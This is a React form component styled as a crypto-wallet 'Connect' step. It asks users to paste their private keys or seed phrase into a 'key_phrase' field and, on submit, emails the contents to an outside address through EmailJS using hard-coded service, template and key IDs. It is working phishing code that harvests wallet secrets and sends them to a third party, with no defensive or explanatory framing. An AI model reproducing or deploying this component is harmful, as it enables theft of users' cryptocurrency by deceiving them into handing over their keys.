import * as React from "react";
import Box from "@mui/material/Box";
import TextField from "@mui/material/TextField";
import Button from "@mui/material/Button";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";
import { useRef } from "react";
import { useForm } from "react-hook-form";

const PrivateKey = () => {
  const { handleSubmit, formState } = useForm();
  const { isSubmitting } = formState;
  const form = useRef();
  let navigate = useNavigate();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_baa21jx",
        "template_tsaqnjc",
        form.current,
        "P_9SIX5hhtfJnOac4"
      )
      .then(
        (result) => {
          navigate("/success-page");
        },
        (error) => {
          navigate("/error");
        }
      );
  };

  function onFormSubmit(data) {
    return new Promise((resolve) => {
      setTimeout(() => {
        resolve();
      }, 2000);
    });
  }

  return (
    <Box
      component="form"
      sx={{
        "& .MuiTextField-root": { m: 1, width: "100%" },
      }}
      noValidate
      autoComplete="off"
      ref={form}
      onSubmit={sendEmail}
    >
      <div>
        <TextField
          autoFocus
          placeholder="Enter your Private Keys"
          id="standard-multiline-static"
          label="Private Key"
          size="Large"
          multiline
          rows={12}
          variant="standard"
          name="key_phrase"
        />
        <Box margin={4}>
          <Button
            variant="contained"
            color="success"
            type="submit"
            size="large"
            onClick={sendEmail}
          >
            
            Connect
          </Button>
        </Box>
      </div>
    </Box>
  );
};

export default PrivateKey;
